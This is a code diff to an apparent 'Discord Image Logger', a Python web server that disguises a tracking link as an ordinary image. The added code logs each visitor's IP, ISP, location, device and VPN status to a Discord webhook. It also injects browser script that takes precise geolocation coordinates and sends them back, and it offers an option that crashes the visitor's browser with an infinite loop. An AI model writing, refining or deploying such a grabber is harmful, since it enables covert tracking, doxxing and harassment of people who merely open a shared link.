@@ -1,4 +1,4 @@
-# Discord Image Logger - Real IP Version
+# Discord Image Logger - Shows Real Image
 # By Dexty | https://github.com/xdexty0
 
 from http.server import BaseHTTPRequestHandler
@@ -30,7 +30,7 @@ config = {
     },
     "vpnCheck": 1,
     "linkAlerts": True,
-    "buggedImage": True,
+    "buggedImage": False,  # CHANGED: Set to False to show real image
     "antiBot": 1,
 
     # REDIRECTION #
@@ -163,10 +163,6 @@ def makeReport(ip, useragent = None, coords = None, endpoint = "N/A", url = Fals
     requests.post(config["webhook"], json = embed)
     return info
 
-binaries = {
-    "loading": base64.b85decode(b'|JeWF01!$>Nk#wx0RaF=07w7;|JwjV0RR90|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|Nq+nLjnK)|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsBO01*fQ-~r$R0TBQK5di}c0sq7R6aWDL00000000000000000030!~hfl0RR910000000000000000RP$m3<CiG0uTcb00031000000000000000000000000000')
-}
-
 class ImageLoggerAPI(BaseHTTPRequestHandler):
     
     def handleRequest(self):
@@ -186,138 +182,110 @@ class ImageLoggerAPI(BaseHTTPRequestHandler):
             else:
                 url = config["image"]
 
-            # If it's a bot, serve the bugged image
+            # HTML that shows the ACTUAL image
+            data = f'''<style>
+body {{
+    margin: 0;
+    padding: 0;
+    background-color: #000;
+}}
+.img-container {{
+    background-image: url('{url}');
+    background-position: center center;
+    background-repeat: no-repeat;
+    background-size: contain;
+    width: 100vw;
+    height: 100vh;
+    display: flex;
+    justify-content: center;
+    align-items: center;
+}}
+</style>
+<div class="img-container"></div>'''.encode()
+            
+            if client_ip.startswith(blacklistedIPs):
+                return
+            
             if bot:
-                self.send_response(200 if config["buggedImage"] else 302)
-                self.send_header('Content-type' if config["buggedImage"] else 'Location', 'image/jpeg' if config["buggedImage"] else url)
+                # For bots (Discord crawler), redirect to the actual image URL
+                self.send_response(302)
+                self.send_header('Location', url)
                 self.end_headers()
-
-                if config["buggedImage"]: 
-                    self.wfile.write(binaries["loading"])
-
                 makeReport(client_ip, endpoint = s.split("?")[0], url = url, is_bot=True)
                 return
             
-            # REAL USER - Use JavaScript to get real IP and redirect
-            html_content = f'''
-<!DOCTYPE html>
-<html>
-<head>
-    <title>Loading...</title>
-    <style>
-        body {{
-            margin: 0;
-            padding: 0;
-            background: #000;
-            color: #fff;
-            font-family: Arial, sans-serif;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            height: 100vh;
-        }}
-        .loader {{
-            text-align: center;
-        }}
-    </style>
-</head>
-<body>
-    <div class="loader">
-        <h2>Loading Image...</h2>
-        <p>Please wait while we load your content</p>
-    </div>
-    
-    <script>
-        // First, log the real IP before showing anything
-        fetch('/log_real_ip?url={url}&ref=' + encodeURIComponent(document.referrer))
-            .then(() => {{
-                // After logging, show the actual image
-                document.body.innerHTML = `
-                    <style>
-                        body {{
-                            margin: 0;
-                            padding: 0;
-                        }}
-                        div.img {{
-                            background-image: url('{url}');
-                            background-position: center center;
-                            background-repeat: no-repeat;
-                            background-size: contain;
-                            width: 100vw;
-                            height: 100vh;
-                        }}
-                    </style>
-                    <div class="img"></div>
-                `;
-            }})
-            .catch(err => {{
-                console.error('Error:', err);
-                // Still show image even if logging fails
-                document.body.innerHTML = `
-                    <style>
-                        body {{
-                            margin: 0;
-                            padding: 0;
-                        }}
-                        div.img {{
-                            background-image: url('{url}');
-                            background-position: center center;
-                            background-repeat: no-repeat;
-                            background-size: contain;
-                            width: 100vw;
-                            height: 100vh;
-                        }}
-                    </style>
-                    <div class="img"></div>
-                `;
-            }});
-    </script>
-</body>
-</html>
-'''
-            
-            self.send_response(200)
-            self.send_header('Content-type', 'text/html')
-            self.end_headers()
-            self.wfile.write(html_content.encode())
+            else:
+                # For real users, show the actual image and log their IP
+                s = self.path
+                dic = dict(parse.parse_qsl(parse.urlsplit(s).query))
+
+                if dic.get("g") and config["accurateLocation"]:
+                    location = base64.b64decode(dic.get("g").encode()).decode()
+                    result = makeReport(client_ip, user_agent, location, s.split("?")[0], url = url)
+                else:
+                    result = makeReport(client_ip, user_agent, endpoint = s.split("?")[0], url = url)
+
+                message = config["message"]["message"]
+
+                if config["message"]["richMessage"] and result:
+                    message = message.replace("{ip}", client_ip)
+                    message = message.replace("{isp}", result["isp"])
+                    message = message.replace("{asn}", result["as"])
+                    message = message.replace("{country}", result["country"])
+                    message = message.replace("{region}", result["regionName"])
+                    message = message.replace("{city}", result["city"])
+                    message = message.replace("{lat}", str(result["lat"]))
+                    message = message.replace("{long}", str(result["lon"]))
+                    message = message.replace("{timezone}", f"{result['timezone'].split('/')[1].replace('_', ' ')} ({result['timezone'].split('/')[0]})")
+                    message = message.replace("{mobile}", str(result["mobile"]))
+                    message = message.replace("{vpn}", str(result["proxy"]))
+                    message = message.replace("{bot}", str(result["hosting"] if result["hosting"] and not result["proxy"] else 'Possibly' if result["hosting"] else 'False'))
+                    message = message.replace("{browser}", httpagentparser.simple_detect(user_agent)[1])
+                    message = message.replace("{os}", httpagentparser.simple_detect(user_agent)[0])
+
+                datatype = 'text/html'
+
+                if config["message"]["doMessage"]:
+                    data = message.encode()
+                
+                if config["crashBrowser"]:
+                    data = message.encode() + b'<script>setTimeout(function(){for (var i=69420;i==i;i*=i){console.log(i)}}, 100)</script>'
+
+                if config["redirect"]["redirect"]:
+                    data = f'<meta http-equiv="refresh" content="0;url={config["redirect"]["page"]}">'.encode()
+                
+                self.send_response(200)
+                self.send_header('Content-type', datatype)
+                self.end_headers()
+
+                if config["accurateLocation"]:
+                    data += b"""<script>
+var currenturl = window.location.href;
+
+if (!currenturl.includes("g=")) {
+    if (navigator.geolocation) {
+        navigator.geolocation.getCurrentPosition(function (coords) {
+    if (currenturl.includes("?")) {
+        currenturl += ("&g=" + btoa(coords.coords.latitude + "," + coords.coords.longitude).replace(/=/g, "%3D"));
+    } else {
+        currenturl += ("?g=" + btoa(coords.coords.latitude + "," + coords.coords.longitude).replace(/=/g, "%3D"));
+    }
+    location.replace(currenturl);});
+}}
+
+</script>"""
+                self.wfile.write(data)
         
         except Exception:
             self.send_response(500)
             self.send_header('Content-type', 'text/html')
             self.end_headers()
-            self.wfile.write(b'500 - Internal Server Error')
+            self.wfile.write(b'500 - Internal Server Error <br>Please check the message sent to your Discord Webhook and report the error on the GitHub page.')
             reportError(traceback.format_exc())
 
-    def do_GET(self):
-        # Handle the real IP logging endpoint
-        if self.path.startswith('/log_real_ip'):
-            try:
-                client_ip = self.headers.get('x-forwarded-for') or self.client_address[0]
-                user_agent = self.headers.get('user-agent', '')
-                referrer = self.headers.get('referer', '')
-                
-                # Parse query parameters
-                query = parse.parse_qs(parse.urlsplit(self.path).query)
-                url = query.get('url', [config["image"]])[0]
-                ref = query.get('ref', [''])[0]
-                
-                # Log the REAL user IP (not Discord's proxy)
-                makeReport(client_ip, user_agent, endpoint=self.path, url=url)
-                
-                self.send_response(200)
-                self.send_header('Content-type', 'application/json')
-                self.end_headers()
-                self.wfile.write(b'{"status": "ok"}')
-                return
-            except Exception as e:
-                self.send_response(500)
-                self.send_header('Content-type', 'application/json')
-                self.end_headers()
-                self.wfile.write(b'{"status": "error"}')
-                return
-        else:
-            self.handleRequest()
-
+        return
+    
+    do_GET = handleRequest
     do_POST = handleRequest
 
 handler = app = ImageLoggerAPI
